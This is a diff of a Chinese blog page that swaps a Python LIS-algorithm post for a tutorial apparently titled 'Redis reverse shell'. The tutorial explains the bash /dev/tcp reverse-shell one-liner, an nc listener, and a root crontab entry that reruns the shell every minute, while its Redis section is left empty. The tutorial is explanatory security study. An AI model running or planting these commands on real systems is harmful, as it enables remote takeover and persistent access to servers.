@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Python,算法," />
+  <meta name="keywords" content="Web安全,Linux,Redis," />
 
 
 
@@ -79,18 +79,21 @@
 
 
 
-<meta name="description" content="题目有一批待处理的木头，每根木头都有长度和重量两个属性处理第一根木头需要花费1元，如果后面处理的木头长度和重量都大于之前的，则不用钱；否则要1元计算最少花费 输入说明：输入中第一行为数据组数，第二行为这组数据的木头数量，第三行为木头的长度，第四行为木头的重量。 1234567252 4 9 2 51 1 3 4 554 5 2 3 19 2 1 5 4  解题思路这题是LIS算法的一个变种先将木头">
+<meta name="description" content="背景知识Linux反弹Shell用于Linux反弹Shell的命令如下 1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;[ip]&#x2F;[port] 0&gt;&amp;1 2&gt;&amp;1  将它分解成以下几个部分，分别理解 1bash -i  打开一个交互式的bash 可以使用命令 echo $- 来判断是否是交互式的Shell，输出结果的解释如下  h：Cache location">
 <meta property="og:type" content="article">
-<meta property="og:title" content="算法：木头处理（LIS算法）">
-<meta property="og:url" content="http://yoursite.com/2020/04/13/%E7%AE%97%E6%B3%95%EF%BC%9A%E6%9C%A8%E5%A4%B4%E5%A4%84%E7%90%86%EF%BC%88LIS%E7%AE%97%E6%B3%95%EF%BC%89/index.html">
+<meta property="og:title" content="Redis反弹Shell">
+<meta property="og:url" content="http://yoursite.com/2020/07/22/Redis%E5%8F%8D%E5%BC%B9Shell/index.html">
 <meta property="og:site_name" content="Oah&#39;s Blog">
-<meta property="og:description" content="题目有一批待处理的木头，每根木头都有长度和重量两个属性处理第一根木头需要花费1元，如果后面处理的木头长度和重量都大于之前的，则不用钱；否则要1元计算最少花费 输入说明：输入中第一行为数据组数，第二行为这组数据的木头数量，第三行为木头的长度，第四行为木头的重量。 1234567252 4 9 2 51 1 3 4 554 5 2 3 19 2 1 5 4  解题思路这题是LIS算法的一个变种先将木头">
-<meta property="article:published_time" content="2020-04-13T03:04:13.000Z">
-<meta property="article:modified_time" content="2020-04-14T06:21:00.391Z">
+<meta property="og:description" content="背景知识Linux反弹Shell用于Linux反弹Shell的命令如下 1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;[ip]&#x2F;[port] 0&gt;&amp;1 2&gt;&amp;1  将它分解成以下几个部分，分别理解 1bash -i  打开一个交互式的bash 可以使用命令 echo $- 来判断是否是交互式的Shell，输出结果的解释如下  h：Cache location">
+<meta property="og:image" content="http://yoursite.com/2020/07/22/Redis%E5%8F%8D%E5%BC%B9Shell/Redis%E5%8F%8D%E5%BC%B9Shell/f32373c66a3c506e2710fce67be5859e.png">
+<meta property="article:published_time" content="2020-07-22T05:18:37.000Z">
+<meta property="article:modified_time" content="2020-07-22T07:45:35.805Z">
 <meta property="article:author" content="Oah">
-<meta property="article:tag" content="Python">
-<meta property="article:tag" content="算法">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="Redis">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/07/22/Redis%E5%8F%8D%E5%BC%B9Shell/Redis%E5%8F%8D%E5%BC%B9Shell/f32373c66a3c506e2710fce67be5859e.png">
 
 
 
@@ -120,13 +123,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2020/04/13/算法：木头处理（LIS算法）/"/>
+  <link rel="canonical" href="http://yoursite.com/2020/07/22/Redis反弹Shell/"/>
 
 
 
 
 
-  <title>算法：木头处理（LIS算法） | Oah's Blog</title>
+  <title>Redis反弹Shell | Oah's Blog</title>
   
 
 
@@ -243,7 +246,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/13/%E7%AE%97%E6%B3%95%EF%BC%9A%E6%9C%A8%E5%A4%B4%E5%A4%84%E7%90%86%EF%BC%88LIS%E7%AE%97%E6%B3%95%EF%BC%89/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/22/Redis%E5%8F%8D%E5%BC%B9Shell/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Oah">
@@ -260,7 +263,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">算法：木头处理（LIS算法）</h1>
+          <h1 class="post-title" itemprop="name headline">Redis反弹Shell</h1>
         
 
         <div class="post-meta">
@@ -272,8 +275,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-13T11:04:13+08:00">
-                2020-04-13
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-22T13:18:37+08:00">
+                2020-07-22
               </time>
             
 
@@ -310,16 +313,107 @@
       
 
       
-        <h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>有一批待处理的木头，每根木头都有长度和重量两个属性<br>处理第一根木头需要花费1元，如果后面处理的木头长度和重量都大于之前的，则不用钱；否则要1元<br>计算最少花费</p>
-<p>输入说明：输入中第一行为数据组数，第二行为这组数据的木头数量，第三行为木头的长度，第四行为木头的重量。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">2</span><br><span class="line">5</span><br><span class="line">2 4 9 2 5</span><br><span class="line">1 1 3 4 5</span><br><span class="line">5</span><br><span class="line">4 5 2 3 1</span><br><span class="line">9 2 1 5 4</span><br></pre></td></tr></table></figure>
+        <h1 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h1><h2 id="Linux反弹Shell"><a href="#Linux反弹Shell" class="headerlink" title="Linux反弹Shell"></a>Linux反弹Shell</h2><p>用于Linux反弹Shell的命令如下</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
 
-<h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>这题是LIS算法的一个变种<br>先将木头按长度递增排序，长度相同时按重量递增排序。就是一个针对重量的LIS算法了</p>
-<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    data_count = int(sys.stdin.readline().strip())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(data_count):</span><br><span class="line">        <span class="comment"># 获取输入</span></span><br><span class="line">        item_count = int(sys.stdin.readline().strip())</span><br><span class="line">        length_list = list(map(int, sys.stdin.readline().strip().split()))</span><br><span class="line">        weight_list = list(map(int, sys.stdin.readline().strip().split()))</span><br><span class="line">        <span class="comment"># 排序</span></span><br><span class="line">        length_list, weight_list, = zip(*sorted(zip(length_list, weight_list)))</span><br><span class="line">        length_list = list(length_list)</span><br><span class="line">        weight_list = list(weight_list)</span><br><span class="line">        <span class="comment"># 计算</span></span><br><span class="line">        cost = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(item_count):</span><br><span class="line">            <span class="keyword">if</span> <span class="number">-1</span> != length_list[i]:</span><br><span class="line">                <span class="comment"># 针对重量的LIS算法</span></span><br><span class="line">                lis = [weight_list[i]]</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> range(i+<span class="number">1</span>, item_count):</span><br><span class="line">                    <span class="keyword">if</span> weight_list[j] &gt;= lis[<span class="number">-1</span>] <span class="keyword">and</span> <span class="number">-1</span> != weight_list[j]:</span><br><span class="line">                        lis.append(weight_list[j])</span><br><span class="line">                        length_list[j] = <span class="number">-1</span></span><br><span class="line">                        weight_list[j] = <span class="number">-1</span></span><br><span class="line">                cost += <span class="number">1</span></span><br><span class="line">        print(cost)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>将它分解成以下几个部分，分别理解</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i</span><br></pre></td></tr></table></figure>
 
-<blockquote>
-<p><code>map()</code> 函数的具体用法参考：<a href="https://www.runoob.com/python/python-func-map.html" target="_blank" rel="noopener">Python map() 函数 | 菜鸟教程</a></p>
-</blockquote>
+<p>打开一个交互式的bash</p>
+<p>可以使用命令 <code>echo $-</code> 来判断是否是交互式的Shell，输出结果的解释如下</p>
+<ul>
+<li>h：Cache location of binaries in the $PATH. Speeds up execution, but fails if you move binaries around during the shell session</li>
+<li>i：The current shell is interactive</li>
+<li>m：Job control is enabled</li>
+<li>B：Brace expansion is enabled</li>
+<li>H：History substitution like !-1</li>
+</ul>
+<p>测试是否是交互式Shell</p>
+<p><img src="Redis%E5%8F%8D%E5%BC%B9Shell/f32373c66a3c506e2710fce67be5859e.png" alt="img"></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/dev/tcp/[ip]/[port]</span><br></pre></td></tr></table></figure>
+
+<p>通过ip和端口与另一台主机建立一个socket连接，另一台主机可以通过 <code>nc -lvp [port]</code> 命令与这台主机通信</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&amp; 0&gt;&amp;1 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>这些命令涉及到了Linux的输入/输出重定向和保留文件描述符</p>
+<p>输入/输出重定向</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>command &gt; file</td>
+<td>将输出重定向到 file</td>
+</tr>
+<tr>
+<td>command &lt; file</td>
+<td>将输入重定向到 file</td>
+</tr>
+<tr>
+<td>command &gt;&gt; file</td>
+<td>将输出以追加的方式重定向到 file</td>
+</tr>
+<tr>
+<td>n &gt; file</td>
+<td>将文件描述符为 n 的文件重定向到 file</td>
+</tr>
+<tr>
+<td>n &gt;&gt; file</td>
+<td>将文件描述符为 n 的文件以追加的方式重定向到 file</td>
+</tr>
+<tr>
+<td>n &gt;&amp; m</td>
+<td>将输出文件 m 和 n 合并</td>
+</tr>
+<tr>
+<td>n &lt;&amp; m</td>
+<td>将输入文件 m 和 n 合并</td>
+</tr>
+<tr>
+<td>&lt;&lt; tag</td>
+<td>将开始标记 tag 和结束标记 tag 之间的内容作为输入</td>
+</tr>
+</tbody></table>
+<p>保留文件描述符</p>
+<table>
+<thead>
+<tr>
+<th>保留文件描述符</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0</td>
+<td>标准输入（STDIN）</td>
+</tr>
+<tr>
+<td>1</td>
+<td>标准输出（STDOUT）</td>
+</tr>
+<tr>
+<td>2</td>
+<td>标准错误输出（STDERR）</td>
+</tr>
+</tbody></table>
+<p>现在开始将这些命令组合起来理解</p>
+<p>首先是 <code>bash -i &gt;&amp; /dev/tcp/[ip]/[port]</code>，它的意思是将这个交互式bash的所有输出都发送到目标主机</p>
+<p><code>2&gt;&amp;1</code> 的意思是将系统的标准输出和标准错误输出合并，也就是所有输出都统一到一个地方</p>
+<p><code>0&gt;&amp;1</code> 的意思是将目标主机的输入发送到bash</p>
+<p>最终就实现了远程反弹Shell</p>
+<h2 id="crontab写Shell"><a href="#crontab写Shell" class="headerlink" title="crontab写Shell"></a>crontab写Shell</h2><p>crontab的作用是设置定时任务，可以通过编辑 <code>/var/spool/cron/root</code> 文件来添加定时任务</p>
+<p>定时任务的写法如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Example of job definition:</span><br><span class="line"># .---------------- minute (0 - 59)</span><br><span class="line"># |  .------------- hour (0 - 23)</span><br><span class="line"># |  |  .---------- day of month (1 - 31)</span><br><span class="line"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="line"># |  |  |  |  .---- day of week (0 - 6) (Sunday&#x3D;0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="line"># |  |  |  |  |</span><br><span class="line"># *  *  *  *  * user-name command to be executed</span><br></pre></td></tr></table></figure>
+
+<p>写进定时任务的内容如下，意思是每分钟运行一次反弹Shell的命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;[ip]&#x2F;[port] 0&gt;&amp;1 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<h1 id="Redis反弹Shell"><a href="#Redis反弹Shell" class="headerlink" title="Redis反弹Shell"></a>Redis反弹Shell</h1><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/Auuuuuuuu/article/details/89059176" target="_blank" rel="noopener">Linux之bash反弹shell原理浅析_Au-CSDN博客_bash -i</a></p>
+<p><a href="https://www.cnblogs.com/iouwenbo/p/11277453.html" target="_blank" rel="noopener">反弹shell原理与实现 - iouwenbo - 博客园</a></p>
+<p><a href="https://www.runoob.com/linux/linux-shell-io-redirections.html" target="_blank" rel="noopener">Shell 输入/输出重定向 | 菜鸟教程</a></p>
+<p><a href="https://segmentfault.com/a/1190000010975294" target="_blank" rel="noopener">linux反弹shell命令解析 - 个人文章 - SegmentFault 思否</a></p>
 
       
     </div>
@@ -337,9 +431,11 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Python/" rel="tag"># Python</a>
+            <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
           
-            <a href="/tags/%E7%AE%97%E6%B3%95/" rel="tag"># 算法</a>
+            <a href="/tags/Linux/" rel="tag"># Linux</a>
+          
+            <a href="/tags/Redis/" rel="tag"># Redis</a>
           
         </div>
       
@@ -352,8 +448,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/04/13/Python%E5%90%8C%E6%97%B6%E6%8E%92%E5%BA%8F%E4%B8%A4%E4%B8%AA%E5%88%97%E8%A1%A8%EF%BC%8C%E4%B8%8B%E6%A0%87%E4%BF%9D%E6%8C%81%E4%B8%80%E8%87%B4/" rel="next" title="Python同时排序两个列表，下标保持一致">
-                <i class="fa fa-chevron-left"></i> Python同时排序两个列表，下标保持一致
+              <a href="/2020/07/21/Vulhub%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89/" rel="next" title="Vulhub学习（四）">
+                <i class="fa fa-chevron-left"></i> Vulhub学习（四）
               </a>
             
           </div>
@@ -362,8 +458,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2020/04/14/%E7%AE%97%E6%B3%95%EF%BC%9A%E6%B1%82%E7%AC%9B%E5%8D%A1%E5%B0%94%E7%A7%AF/" rel="prev" title="算法：求笛卡尔积">
-                算法：求笛卡尔积 <i class="fa fa-chevron-right"></i>
+              <a href="/9999/09/09/%E8%B5%84%E6%BA%90%E6%94%B6%E8%97%8F/" rel="prev" title="【置顶】资源收藏">
+                【置顶】资源收藏 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -487,7 +583,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#题目"><span class="nav-number">1.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#解题"><span class="nav-number">2.</span> <span class="nav-text">解题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#思路"><span class="nav-number">2.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#代码"><span class="nav-number">2.2.</span> <span class="nav-text">代码</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#背景知识"><span class="nav-number">1.</span> <span class="nav-text">背景知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux反弹Shell"><span class="nav-number">1.1.</span> <span class="nav-text">Linux反弹Shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#crontab写Shell"><span class="nav-number">1.2.</span> <span class="nav-text">crontab写Shell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Redis反弹Shell"><span class="nav-number">2.</span> <span class="nav-text">Redis反弹Shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考文章"><span class="nav-number">3.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
             
 
           </div>
